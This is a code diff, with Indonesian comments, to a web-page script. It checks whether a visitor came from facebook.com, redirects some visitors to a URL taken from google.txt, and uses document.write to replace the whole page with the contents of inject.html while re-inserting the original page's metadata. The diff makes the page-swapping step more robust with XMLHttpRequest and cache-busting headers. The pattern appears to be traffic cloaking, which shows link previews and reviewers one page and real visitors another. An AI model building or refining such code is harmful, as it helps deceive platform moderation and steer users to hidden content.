@@ -47,20 +47,60 @@
         injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
       } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
-        // Uji coba tanpa referer Facebook jika testing = true
-        fetch('/inject.html')
-          .then((response) => {
-            if (!response.ok) {
-              throw new Error(`Failed to fetch inject.html: ${response.status}`);
+        // Cross-browser compatible approach for fetching inject.html
+        const loadInjectHTML = () => {
+          // Use XMLHttpRequest for maximum browser compatibility
+          const xhr = new XMLHttpRequest();
+          const timestamp = new Date().getTime();
+          const injectPath = window.location.origin + '/inject.html?nocache=' + timestamp;
+          
+          xhr.open('GET', injectPath, true);
+          xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+          xhr.setRequestHeader('Pragma', 'no-cache');
+          xhr.setRequestHeader('Expires', '0');
+          
+          xhr.onload = function() {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              const html = xhr.responseText;
+              
+              if (!html || html.trim() === '') {
+                console.error('Fetched inject.html is empty');
+                alert('Failed to load content. Please refresh the page.');
+                return;
+              }
+              
+              console.log('Inject HTML fetched successfully');
+              
+              try {
+                // Replace document content
+                document.open();
+                document.write(html);
+                document.close();
+                
+                // Inject metadata after DOM replacement
+                setTimeout(() => {
+                  injectMetadata(originalHtml);
+                  console.log('Metadata injection complete');
+                }, 200); // Increased timeout for slower browsers
+              } catch (e) {
+                console.error('Error replacing document content:', e);
+              }
+            } else {
+              console.error('Failed to fetch inject.html:', xhr.status, xhr.statusText);
+              alert('Failed to load content. Please try again later.');
             }
-            return response.text();
-          })
-          .then((html) => {
-            console.log('Inject HTML fetched successfully:', html); // Log konten inject.html
-            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
-            injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
-          })
-          .catch((err) => console.error('Error loading inject.html:', err));
+          };
+          
+          xhr.onerror = function() {
+            console.error('Network error while fetching inject.html');
+            alert('Network error. Please check your connection and try again.');
+          };
+          
+          xhr.send();
+        };
+        
+        // Execute the function to load inject.html
+        loadInjectHTML();
       }
     })
     .catch((err) => console.error('Error loading URLs:', err));
